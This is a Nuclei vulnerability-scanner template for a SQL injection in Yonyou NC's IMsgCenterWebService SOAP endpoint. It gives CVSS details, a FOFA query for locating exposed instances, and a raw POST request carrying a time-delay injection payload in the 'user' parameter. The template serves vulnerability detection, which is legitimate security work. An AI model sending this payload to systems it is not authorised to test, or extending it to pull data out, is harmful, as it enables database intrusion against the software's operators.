id: yonyou-nc-imsgcenterwebservice-sqli

info:
  name: Yonyou NC IMsgCenterWebService SQL Injection
  author: qwtd
  severity: high
  description: |
    A SQL Injection vulnerability exists in the
    `nc.itf.msgcenter.IMsgCenterWebService` SOAP service of Yonyou NC.
    Insufficient validation of user-supplied input may allow attackers
    to inject arbitrary SQL statements, resulting in unauthorized
    database access and potential disclosure of sensitive information.
  impact: |
    Successful exploitation may allow attackers to:
      - Extract sensitive database information.
      - Enumerate database structures.
      - Bypass application logic.
      - Modify or delete database records.
      - Potentially achieve further compromise depending on database privileges.
  remediation: |
    Apply the latest security updates provided by Yonyou.
    Implement parameterized queries and proper input validation.
    Restrict access to SOAP interfaces from untrusted networks.
  reference:
    - https://www.yonyou.com/
  classification:
    cwe-id: CWE-89
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 9.1
  metadata:
    vendor: Yonyou
    product: NC
    fofa-query: app="用友-NC-Cloud"
  tags: Yonyou-UFIDA-NC,用友-NC-Cloud

http:
  - method: POST
    raw:
      - |
        POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: urn:doAction
        Content-Type: text/xml;charset=UTF-8

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
           <soapenv:Header/>
           <soapenv:Body>
              <ims:doAction>
                 <dataSource>NC65</dataSource>
                 <actionCode>test</actionCode>
                 <pluginType>test</pluginType>
                 <param>{"user":"'waitfor delay'0:0:5","pk_sourcemsg":""}</param>
              </ims:doAction>
           </soapenv:Body>
        </soapenv:Envelope>

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
      - type: status
        status:
          - 200
      - type: word
        words:
          - "datasource"